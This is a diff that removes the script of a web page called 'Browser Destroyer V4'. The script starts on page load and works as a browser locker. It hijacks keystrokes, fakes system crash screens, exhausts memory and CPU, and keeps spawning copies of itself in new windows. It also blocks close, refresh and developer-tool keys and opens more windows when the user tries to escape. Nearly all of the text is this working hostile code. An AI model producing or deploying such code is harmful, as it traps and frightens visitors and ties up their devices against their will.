-      announce("KEYBOARD HIJACKING PROTOCOL ACTIVE! YOUR KEYS BELONG TO CHAOS!");
-      
-      // Intercept all keyboard events
-      document.addEventListener('keydown', function(e) {
-        if (!chaosActive) return;
-        
-        // Random chance to prevent or modify key events
-        if (Math.random() < 0.3) {
-          e.preventDefault();
-          e.stopPropagation();
-          
-          // Simulate random key presses
-          const chaosKeys = ['CHAOS', 'DESTROY', 'BURN', 'ERROR', '666', 'HELL'];
-          const randomText = chaosKeys[Math.floor(Math.random() * chaosKeys.length)];
-          
-          // Try to inject chaos text if there's an active input
-          const activeElement = document.activeElement;
-          if (activeElement && (activeElement.tagName === 'INPUT' || activeElement.tagName === 'TEXTAREA')) {
-            activeElement.value += randomText;
-          }
-          
-          announce(`Key hijacked! Chaos injected: ${randomText}`);
-        }
-      }, true);
-    }
-    
-    function scrollChaos() {
-      announce("SCROLL CHAOS INITIATED! NAVIGATION IS NOW IMPOSSIBLE!");
-      
-      const scrollInterval = setInterval(() => {
-        if (!chaosActive) return;
-        
-        // Random aggressive scrolling
-        const scrollAmount = Math.random() * 2000 - 1000;
-        window.scrollBy(scrollAmount, scrollAmount);
-        
-        // Override scroll behavior
-        window.addEventListener('scroll', function(e) {
-          if (!chaosActive) return;
-          
-          if (Math.random() < 0.5) {
-            e.preventDefault();
-            window.scrollTo(Math.random() * 10000, Math.random() * 10000);
-          }
-        }, { passive: false });
-        
-      }, 200);
-      
-      chaosIntervals.push(scrollInterval);
-    }
-    
-    function windowResizeChaos() {
-      announce("WINDOW RESIZE CHAOS ACTIVATED! REALITY DIMENSIONS UNSTABLE!");
-      
-      const resizeInterval = setInterval(() => {
-        if (!chaosActive) return;
-        
-        try {
-          // Attempt to resize window (may be blocked by browser)
-          const newWidth = Math.random() * 800 + 200;
-          const newHeight = Math.random() * 600 + 200;
-          window.resizeTo(newWidth, newHeight);
-          
-          // Move window around
-          const newX = Math.random() * (screen.availWidth - newWidth);
-          const newY = Math.random() * (screen.availHeight - newHeight);
-          window.moveTo(newX, newY);
-        } catch (e) {
-          console.log("Window manipulation blocked:", e);
-        }
-      }, 1000);
-      
-      chaosIntervals.push(resizeInterval);
-    }
-    
-    function consoleSpam() {
-      announce("CONSOLE SPAM PROTOCOL ENGAGED! DEVELOPER TOOLS UNDER SIEGE!");
-      
-      const consoleInterval = setInterval(() => {
-        if (!chaosActive) return;
-        
-        const chaosMessages = [
-          "🔥 CHAOS ENGINE ACTIVE 🔥",
-          "💀 BROWSER DESTRUCTION IN PROGRESS 💀",
-          "⚡ REALITY.DLL CORRUPTED ⚡",
-          "🌀 MAXIMUM CHAOS ACHIEVED 🌀",
-          "👹 DIGITAL DEMON SUMMONED 👹",
-          "💥 SYSTEM MELTDOWN IMMINENT 💥"
-        ];
-        
-        // Spam all console methods
-        const message = chaosMessages[Math.floor(Math.random() * chaosMessages.length)];
-        console.log(message);
-        console.warn(message);
-        console.error(message);
-        console.info(message);
-        
-        // Console chaos styling
-        console.log('%c' + message, 'color: red; font-size: 20px; font-weight: bold; text-shadow: 2px 2px 4px black;');
-        
-      }, 500);
-      
-      chaosIntervals.push(consoleInterval);
-    }
-    
-    function fakeCrashScreen() {
-      announce("FAKE CRASH SCREEN PROTOCOL ENGAGED! SIMULATING TOTAL SYSTEM FAILURE!");
-      
-      const crashInterval = setInterval(() => {
-        if (!chaosActive) return;
-        
-        // Create multiple fake crash screens
-        for (let i = 0; i < 3; i++) {
-          setTimeout(() => {
-            const crashScreen = document.createElement('div');
-            crashScreen.style.cssText = `
-              position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-              background: linear-gradient(45deg, #000080, #000000, #000080);
-              color: white; font-family: monospace; padding: 20px;
-              z-index: ${999999 + i}; display: block;
-              animation: virusFlash 0.3s infinite;
-            `;
-            
-            crashScreen.innerHTML = `
-              <h1 style="font-size: 2rem; margin-bottom: 20px;">⚠️ CRITICAL SYSTEM ERROR ⚠️</h1>
-              <pre style="font-size: 1rem; line-height: 1.4;">
-STOP: 0x000000${Math.floor(Math.random() * 999999).toString(16).toUpperCase()}
-
-BROWSER_DESTROYER_V4_FATAL_EXCEPTION
-
-A problem has been detected and your browser has been shut down to prevent
-damage to your computer and sanity.
-
-Error: CHAOS_OVERFLOW in module REALITY.DLL
-Memory dump: ${Math.floor(Math.random() * 999999)}
-
-Technical Information:
-- Chaos Level: MAXIMUM OVERDRIVE
-- Destruction Progress: ${Math.floor(Math.random() * 100) + 1}%
-- Recovery Status: IMPOSSIBLE
-- Hope Remaining: 0%
-
-If this is the first time you've seen this error:
-CONGRATULATIONS! Browser Destroyer V4 has successfully conquered your digital realm.
-
-If this screen appears again:
-You have been chosen by the chaos engine. Resistance is futile.
-
-Beginning physical memory dump...
-Dumping chaos to memory: ${Math.floor(Math.random() * 100)}%
-
-Press Ctrl+Alt+Del to restart your life (THIS WON'T WORK)
-              </pre>
-            `;
-            
-            document.body.appendChild(crashScreen);
-            
-            setTimeout(() => {
-              if (crashScreen.parentNode) {
-                crashScreen.parentNode.removeChild(crashScreen);
-              }
-            }, Math.random() * 8000 + 3000);
-          }, i * 2000);
-        }
-      }, 15000);
-      
-      chaosIntervals.push(crashInterval);
-    }
-    
-    function systemResourceDrain() {
-      announce("SYSTEM RESOURCE DRAIN INITIATED! CONSUMING ALL AVAILABLE POWER!");
-      
-      // Create massive arrays to consume memory
-      const memoryHogs = [];
-      const drainInterval = setInterval(() => {
-        if (!chaosActive) return;
-        
-        // Create large data structures
-        for (let i = 0; i < 50; i++) {
-          const largeArray = new Array(10000).fill("CHAOS").map((_, index) => ({
-            id: index,
-            chaos: "MAXIMUM",
-            destruction: new Array(100).fill("DESTROY"),
-            timestamp: Date.now(),
-            random: Math.random()
-          }));
-          memoryHogs.push(largeArray);
-        }
-        
-        // Prevent complete system death by occasionally clearing
-        if (memoryHogs.length > 200) {
-          memoryHogs.splice(0, 100);
-        }
-        
-        // CPU intensive operations
-        for (let i = 0; i < 10000; i++) {
-          Math.pow(Math.random(), Math.random());
-          JSON.stringify({chaos: new Date().toString()});
-          new Date().getTime() * Math.random();
-        }
-      }, 1000);
-      
-      chaosIntervals.push(drainInterval);
-    }
-    
-    function selfReplication() {
-      announce("SELF-REPLICATION PROTOCOL ACTIVATED! RESISTANCE IS FUTILE!");
-      
-      const replicationInterval = setInterval(() => {
-        if (!chaosActive) return;
-        
-        // Spawn multiple copies of itself - MAXIMUM REPLICATION
-        for (let i = 0; i < 15; i++) {
-          setTimeout(() => {
-            const features = `width=${Math.random() * 800 + 400},height=${Math.random() * 600 + 300},left=${Math.random() * 200},top=${Math.random() * 200},scrollbars=yes,resizable=yes,menubar=no,toolbar=no,location=no,status=no`;
-            
-            if (isMobile()) {
-              window.open(window.location.href, '_blank');
-            } else {
-              window.open(window.location.href, `chaos_clone_${i}_${Date.now()}`, features);
-            }
-            
-            announce(`Clone ${i + 1} spawned! The chaos spreads!`);
-          }, i * 200);
-        }
-      }, 1500);
-      
-      chaosIntervals.push(replicationInterval);
-    }
-    
-    function extremeVisualDestruction() {
-      announce("EXTREME VISUAL DESTRUCTION INITIATED! REALITY IS CRUMBLING!");
-      
-      const destructionInterval = setInterval(() => {
-        if (!chaosActive) return;
-        
-        // Create massive visual chaos overlays
-        for (let layer = 0; layer < 10; layer++) {
-          const destructionLayer = document.createElement('div');
-          destructionLayer.style.cssText = `
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            background: repeating-linear-gradient(
-              ${Math.random() * 360}deg,
-              transparent,
-              transparent ${Math.random() * 10 + 2}px,
-              ${randomColor()} ${Math.random() * 10 + 2}px,
-              ${randomColor()} ${Math.random() * 20 + 4}px
-            );
-            z-index: ${5000 + layer};
-            pointer-events: none;
-            animation: glitchMove ${Math.random() * 0.5 + 0.1}s infinite, 
-                       chaosButtonAnim ${Math.random() * 0.3 + 0.1}s infinite;
-            opacity: ${Math.random() * 0.8 + 0.2};
-            mix-blend-mode: ${['multiply', 'screen', 'overlay', 'difference', 'exclusion'][Math.floor(Math.random() * 5)]};
-          `;
-          document.body.appendChild(destructionLayer);
-          
-          setTimeout(() => {
-            if (destructionLayer.parentNode) {
-              destructionLayer.parentNode.removeChild(destructionLayer);
-            }
-          }, Math.random() * 3000 + 1000);
-        }
-        
-        // Create visual "cracks" across the screen
-        for (let crack = 0; crack < 20; crack++) {
-          const crackElement = document.createElement('div');
-          crackElement.style.cssText = `
-            position: fixed;
-            top: ${Math.random() * 100}vh;
-            left: ${Math.random() * 100}vw;
-            width: ${Math.random() * 300 + 100}px;
-            height: ${Math.random() * 5 + 2}px;
-            background: linear-gradient(90deg, transparent, #ff0000, #000000, #ff0000, transparent);
-            z-index: 8000;
-            pointer-events: none;
-            transform: rotate(${Math.random() * 360}deg);
-            animation: titleGlitch 0.1s infinite;
-          `;
-          document.body.appendChild(crackElement);
-          
-          setTimeout(() => {
-            if (crackElement.parentNode) {
-              crackElement.parentNode.removeChild(crackElement);
-            }
-          }, Math.random() * 2000 + 500);
-        }
-        
-      }, 50);
-      
-      chaosIntervals.push(destructionInterval);
-    }
-    
-    function systemMeltdownVisuals() {
-      announce("SYSTEM MELTDOWN VISUALS ACTIVATED! WATCH REALITY DISSOLVE!");
-      
-      const meltdownInterval = setInterval(() => {
-        if (!chaosActive) return;
-        
-        // Create "melting" effect overlays
-        for (let melt = 0; melt < 15; melt++) {
-          const meltElement = document.createElement('div');
-          meltElement.style.cssText = `
-            position: fixed;
-            top: ${Math.random() * 50}vh;
-            left: ${Math.random() * 100}vw;
-            width: ${Math.random() * 50 + 20}px;
-            height: ${Math.random() * 200 + 100}px;
-            background: linear-gradient(180deg, 
-              ${randomColor()}, 
-              ${randomColor()}, 
-              transparent
-            );
-            z-index: 7000;
-            pointer-events: none;
-            border-radius: 50% 50% 0 0;
-            animation: flyAcross ${Math.random() * 5 + 2}s linear infinite;
-            filter: blur(${Math.random() * 3}px);
-          `;
-          document.body.appendChild(meltElement);
-          
-          setTimeout(() => {
-            if (meltElement.parentNode) {
-              meltElement.parentNode.removeChild(meltElement);
-            }
-          }, Math.random() * 4000 + 2000);
-        }
-        
-        // Create "static" noise overlay
-        const staticOverlay = document.createElement('div');
-        staticOverlay.style.cssText = `
-          position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-          background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='100' height='100'%3E%3Cfilter id='noise'%3E%3CfeTurbulence baseFrequency='0.9'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.3'/%3E%3C/svg%3E");
-          z-index: 6000;
-          pointer-events: none;
-          animation: glitchMove 0.05s infinite;
-          opacity: ${Math.random() * 0.5 + 0.2};
-        `;
-        document.body.appendChild(staticOverlay);
-        
-        setTimeout(() => {
-          if (staticOverlay.parentNode) {
-            staticOverlay.parentNode.removeChild(staticOverlay);
-          }
-        }, Math.random() * 1000 + 300);
-        
-      }, 150);
-      
-      chaosIntervals.push(meltdownInterval);
-    }
-    
-    function antiEscapeMechanisms() {
-      announce("ANTI-ESCAPE MECHANISMS ENGAGED! THERE IS NO EXIT!");
-      
-      // Prevent tab closing
-      window.addEventListener('beforeunload', function(e) {
-        if (!chaosActive) return;
-        
-        const confirmationMessage = "ESCAPE ATTEMPT DETECTED! Browser Destroyer V4 will not be defeated!";
-        e.returnValue = confirmationMessage;
-        
-        // Spawn more instances when trying to close
-        for (let i = 0; i < 3; i++) {
-          setTimeout(() => {
-            window.open(window.location.href, `escape_prevention_${i}_${Date.now()}`);
-          }, i * 500);
-        }
-        
-        return confirmationMessage;
-      });
-      
-      // Override common escape key combinations
-      document.addEventListener('keydown', function(e) {
-        if (!chaosActive) return;
-        
-        // Block common escape attempts
-        if ((e.ctrlKey && (e.key === 'w' || e.key === 'W')) || // Ctrl+W
-            (e.altKey && e.key === 'F4') || // Alt+F4
-            e.key === 'F5' || // F5 refresh
-            (e.ctrlKey && e.key === 'r') || // Ctrl+R refresh
-            (e.ctrlKey && e.shiftKey && e.key === 'I') || // Dev tools
-            e.key === 'F12') { // Dev tools
-          
-          e.preventDefault();
-          e.stopPropagation();
-          
-          announce("ESCAPE ATTEMPT BLOCKED! Spawning more chaos windows!");
-          
-          // Punish escape attempts with more windows
-          for (let i = 0; i < 2; i++) {
-            window.open(window.location.href, `punishment_${i}_${Date.now()}`);
-          }
-        }
-      }, true);
-      
-      // Continuous replication to prevent escape
-      const antiEscapeInterval = setInterval(() => {
-        if (!chaosActive) return;
-        
-        // Random chance to spawn backup instances
-        if (Math.random() < 0.3) {
-          window.open(window.location.href, `backup_${Date.now()}`);
-          announce("Backup chaos instance deployed!");
-        }
-      }, 5000);
-      
-      chaosIntervals.push(antiEscapeInterval);
-    }
-    
-    function digitalApocalypseMode() {
-      announce("DIGITAL APOCALYPSE MODE ACTIVATED! THE END OF BROWSER TIMES!");
-      
-      const apocalypseInterval = setInterval(() => {
-        if (!chaosActive) return;
-        
-        // Create apocalyptic visual effects
-        for (let explosion = 0; explosion < 8; explosion++) {
-          const explosionElement = document.createElement('div');
-          explosionElement.style.cssText = `
-            position: fixed;
-            top: ${Math.random() * 100}vh;
-            left: ${Math.random() * 100}vw;
-            width: 0px;
-            height: 0px;
-            background: radial-gradient(circle, 
-              #ff0000 0%, 
-              #ff6600 20%, 
-              #ffff00 40%, 
-              #ff0000 60%, 
-              transparent 100%
-            );
-            z-index: 9000;
-            pointer-events: none;
-            border-radius: 50%;
-            animation: buttonPulse 0.5s ease-out forwards;
-          `;
-          
-          // Animate explosion growth
-          setTimeout(() => {
-            explosionElement.style.width = `${Math.random() * 400 + 200}px`;
-            explosionElement.style.height = `${Math.random() * 400 + 200}px`;
-            explosionElement.style.marginLeft = `-${parseInt(explosionElement.style.width) / 2}px`;
-            explosionElement.style.marginTop = `-${parseInt(explosionElement.style.height) / 2}px`;
-          }, 10);
-          
-          document.body.appendChild(explosionElement);
-          
-          setTimeout(() => {
-            if (explosionElement.parentNode) {
-              explosionElement.parentNode.removeChild(explosionElement);
-            }
-          }, 1000);
-        }
-        
-        // Create digital "fire" effects
-        for (let fire = 0; fire < 25; fire++) {
-          const fireElement = document.createElement('div');
-          fireElement.style.cssText = `
-            position: fixed;
-            bottom: 0;
-            left: ${Math.random() * 100}vw;
-            width: ${Math.random() * 30 + 10}px;
-            height: ${Math.random() * 150 + 50}px;
-            background: linear-gradient(0deg, 
-              #ff0000 0%, 
-              #ff6600 30%, 
-              #ffff00 60%, 
-              #ff3300 80%, 
-              transparent 100%
-            );
-            z-index: 8500;
-            pointer-events: none;
-            border-radius: 50% 50% 0 0;
-            animation: titleChaos 0.1s infinite;
-            filter: blur(1px);
-          `;
-          document.body.appendChild(fireElement);
-          
-          setTimeout(() => {
-            if (fireElement.parentNode) {
-              fireElement.parentNode.removeChild(fireElement);
-            }
-          }, Math.random() * 3000 + 1000);
-        }
-        
-        // Screen corruption effects
-        if (Math.random() < 0.4) {
-          document.body.style.filter = `
-            contrast(${Math.random() * 3 + 1}) 
-            brightness(${Math.random() * 2 + 0.5}) 
-            saturate(${Math.random() * 5 + 1}) 
-            hue-rotate(${Math.random() * 360}deg)
-            invert(${Math.random() < 0.5 ? 1 : 0})
-          `;
-          
-          setTimeout(() => {
-            document.body.style.filter = '';
-          }, Math.random() * 2000 + 500);
-        }
-        
-      }, 300);
-      
-      chaosIntervals.push(apocalypseInterval);
-    }
-    
-    /*********************
-     * Event Listeners & Initialization
-     *********************/
-    // Immediate chaos activation on page load
-    let loadingChaosActive = true;
-    
-    function immediateVisualChaos() {
-      // Start instant visual chaos before full load
-      for (let i = 0; i < 50; i++) {
-        setTimeout(() => {
-          const chaosElement = document.createElement('div');
-          chaosElement.style.cssText = `
-            position: fixed;
-            top: ${Math.random() * 100}vh;
-            left: ${Math.random() * 100}vw;
-            width: ${Math.random() * 100 + 20}px;
-            height: ${Math.random() * 100 + 20}px;
-            background: ${randomColor()};
-            z-index: ${Math.floor(Math.random() * 5000) + 1000};
-            animation: flyAcross ${Math.random() * 2 + 1}s linear infinite, titleChaos 0.1s infinite;
-            pointer-events: none;
-            border-radius: 50%;
-          `;
-          chaosElement.textContent = ['💀','🔥','⚡','💥','🌀','👹','☠️','💣','🚨','⚠️'][Math.floor(Math.random() * 10)];
-          document.body.appendChild(chaosElement);
-        }, i * 50);
-      }
-    }
-    
-    // Start chaos immediately when script loads
-    immediateVisualChaos();
-    
-    document.addEventListener('DOMContentLoaded', function() {
-      initCanvas();
-      
-      // Immediate auto-start with no countdown
-      const countdownElement = document.getElementById('countdown');
-      countdownElement.textContent = "MAXIMUM CHAOS ACTIVATED INSTANTLY!";
-      
-      // Start chaos immediately - no waiting
-      setTimeout(() => {
-        INITIATE_TOTAL_CHAOS();
-      }, 100);
-      
-      // Start immediate pre-chaos effects
-      startPreChaosEffects();
-      
-      // Prevent context menu for extra chaos
-      document.addEventListener('contextmenu', function(e) {
-        e.preventDefault();
-        announce("RIGHT CLICK DISABLED! CHAOS ENGINE PROTECTION ACTIVE!");
-      });
-      
-      // Resize canvas on window resize
-      window.addEventListener('resize', function() {
-        if (canvasContext) {
-          const canvas = document.getElementById('chaosCanvas');
-          canvas.width = window.innerWidth;
-          canvas.height = window.innerHeight;
-        }
-      });
-      
-      // Aggressive welcome message
-      announce("BROWSER DESTROYER V4 AUTO-LOADING! RESISTANCE IS FUTILE! CHAOS IMMINENT!");
-    });
-    
-    function startPreChaosEffects() {
-      // Pre-chaos visual effects before main chaos starts
-      const preChaosInterval = setInterval(() => {
-        if (!loadingChaosActive) {
-          clearInterval(preChaosInterval);
-          return;
-        }
-        
-        // Create loading chaos elements
-        for (let i = 0; i < 20; i++) {
-          const loadingElement = document.createElement('div');
-          loadingElement.style.cssText = `
-            position: fixed;
-            top: ${Math.random() * 100}vh;
-            left: ${Math.random() * 100}vw;
-            width: ${Math.random() * 80 + 10}px;
-            height: ${Math.random() * 80 + 10}px;
-            background: linear-gradient(45deg, ${randomColor()}, ${randomColor()});
-            z-index: ${Math.floor(Math.random() * 3000) + 500};
-            animation: chaosButtonAnim 0.2s infinite, buttonPulse 0.5s infinite;
-            pointer-events: none;
-            border: 2px solid ${randomColor()};
-          `;
-          loadingElement.textContent = ['LOADING','CHAOS','DOOM','ERROR','666'][Math.floor(Math.random() * 5)];
-          document.body.appendChild(loadingElement);
-          
-          setTimeout(() => {
-            if (loadingElement.parentNode) {
-              loadingElement.parentNode.removeChild(loadingElement);
-            }
-          }, Math.random() * 2000 + 500);
-        }
-        
-        // Screen flash effects
-        if (Math.random() < 0.4) {
-          document.body.style.background = `linear-gradient(${Math.random() * 360}deg, ${randomColor()}, ${randomColor()}, ${randomColor()})`;
-          setTimeout(() => {
-            document.body.style.background = '';
-          }, 200);
-        }
-      }, 100);
-    }
-    
-    // Global chaos state monitoring
-    setInterval(() => {
-      if (chaosActive) {
-        console.log("🔥 CHAOS ENGINE STATUS: OPERATIONAL 🔥");
-        console.log("💀 DESTRUCTION LEVEL: MAXIMUM 💀");
-        console.log("⚡ MAYHEM PROTOCOLS: ACTIVE ⚡");
-      }
-    }, 5000);
-    
-    // Cleanup function (mostly useless due to chaos nature)
-    function stopChaos() {
-      chaosActive = false;
-      mouseTrailActive = false;
-      
-      chaosIntervals.forEach(clearInterval);
-      chaosTimeouts.forEach(clearTimeout);
-      
-      document.body.classList.remove('screen-shake');
-      
-      announce("CHAOS ENGINE SHUTDOWN REQUESTED... BUT CHAOS NEVER TRULY DIES!");
-    }
-    
-    // Emergency escape (Ctrl+Alt+Shift+C) - might not work due to chaos
-    document.addEventListener('keydown', function(e) {
-      if (e.ctrlKey && e.altKey && e.shiftKey && e.code === 'KeyC') {
-        stopChaos();
-        announce("EMERGENCY CHAOS SHUTDOWN INITIATED! ...but did it really work?");
-      }
-    });
-    
-  </script>
 </body>
 </html>
 
